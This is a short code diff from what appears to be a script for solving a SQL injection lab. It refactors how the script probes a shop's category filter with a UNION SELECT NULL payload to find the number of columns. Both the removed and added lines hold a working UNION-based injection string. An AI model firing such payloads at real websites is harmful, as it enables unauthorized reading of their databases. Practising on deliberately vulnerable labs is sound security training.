@@ -27,12 +27,8 @@ def main(args):
     log.info("Determining number of columns.")
     while len(nulls_list) < 50:
         nulls = ",".join(nulls_list)
-        filter_path = f"filter?category=' UNION SELECT {nulls}-- "
-        exploit_url = shop.base_url + filter_path
-        if args.no_proxy:
-            resp = requests.get(exploit_url)
-        else:
-            resp = requests.get(exploit_url, proxies=utils.PROXIES, verify=False)
+        category = f"' UNION SELECT {nulls}-- "
+        resp = shop.get_category(category)
         if resp.status_code == 200:
             num_columns = len(nulls_list)
             break
